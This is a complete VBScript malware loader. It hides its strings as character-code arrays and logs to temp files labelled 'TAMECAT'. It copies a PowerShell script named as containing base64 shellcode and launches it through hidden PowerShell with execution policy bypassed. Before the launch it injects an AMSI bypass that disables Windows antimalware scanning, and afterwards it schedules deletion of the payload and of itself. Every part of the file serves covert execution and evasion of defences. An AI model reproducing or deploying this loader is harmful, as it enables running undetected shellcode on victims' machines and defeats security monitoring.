Option Explicit

Dim shell, fso, ps1Path, tempPS1, cmd, cleanCmd, debugFile, psLogFile, execResult, dbg

Function R(a)
    Dim o, i
    For i = 0 To UBound(a)
        o = o & Chr(a(i))
    Next
    R = o
End Function

Dim wshArr : wshArr = Array(87,83,99,114,105,112,116,46,83,104,101,108,108)
Dim psArr  : psArr  = Array(112,111,119,101,114,115,104,101,108,108,46,101,120,101)
Dim amsiArr: amsiArr = Array(91,82,101,102,93,46,65,115,115,101,109,98,108,121,46,71,101,116,84,121,112,101,40,39,83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,65,109,115,105,85,116,105,108,115,39,41,46,71,101,116,70,105,101,108,100,40,39,97,109,115,105,73,110,105,116,70,97,105,108,101,100,39,44,39,78,111,110,80,117,98,108,105,99,44,83,116,97,116,105,99,39,41,46,83,101,116,86,97,108,117,101,40,36,110,117,108,108,44,36,116,114,117,101,41)
Dim fsoArr : fsoArr  = Array(83,99,114,105,112,116,105,110,103,46,70,105,108,101,83,121,115,116,101,109,79,98,106,101,99,116)
Dim dbgArr : dbgArr  = Array(92,84,65,77,69,67,65,84,95,68,69,66,85,71,46,116,120,116)
Dim plogArr: plogArr = Array(92,84,65,77,69,67,65,84,95,80,83,95,76,79,71,46,116,120,116)

Set shell = CreateObject(R(wshArr))
Set fso   = CreateObject(R(fsoArr))

debugFile = fso.GetSpecialFolder(2) & R(dbgArr)
psLogFile = fso.GetSpecialFolder(2) & R(plogArr)

Set dbg = fso.OpenTextFile(debugFile, 8, True)
dbg.WriteLine "[+] VBS started at " & Now
dbg.Close

ps1Path = fso.GetParentFolderName(WScript.ScriptFullName) & "\58_v156_with_base64_shellcode.ps1"
tempPS1 = fso.GetSpecialFolder(2) & "\t" & Timer & ".ps1"

If Not fso.FileExists(ps1Path) Then
    Set dbg = fso.OpenTextFile(debugFile, 8, True)
    dbg.WriteLine "[!] PS1 file not found: " & ps1Path
    dbg.Close
    WScript.Quit 1
End If

fso.CopyFile ps1Path, tempPS1, True
Set dbg = fso.OpenTextFile(debugFile, 8, True)
dbg.WriteLine "[+] PS1 copied to " & tempPS1
dbg.WriteLine "[+] PS1 size: " & fso.GetFile(tempPS1).Size & " bytes"
dbg.Close

' PowerShell command: AMSI bypass + dot-source + output capture
cmd = R(psArr) & " -NoP -NonI -W Hidden -Exec Bypass -Command " & _
      """& { " & R(amsiArr) & " ; . '""" & tempPS1 & """' 2>&1 | Out-File -FilePath '""" & psLogFile & """' -Encoding UTF8 }"""

Set dbg = fso.OpenTextFile(debugFile, 8, True)
dbg.WriteLine "[+] Launching PowerShell..."
dbg.Close

execResult = shell.Run(cmd, 0, True)

Set dbg = fso.OpenTextFile(debugFile, 8, True)
dbg.WriteLine "[+] PowerShell finished with exit code: " & execResult
dbg.Close

' Self-deletion after 35 seconds
cleanCmd = "cmd.exe /c timeout /t 35 /nobreak & del /f /q """ & tempPS1 & """ & del /f /q """ & WScript.ScriptFullName & """"
shell.Run cleanCmd, 0, False

Set dbg = fso.OpenTextFile(debugFile, 8, True)
dbg.WriteLine "[+] Cleanup scheduled, VBS exiting."
dbg.Close

WScript.Quit
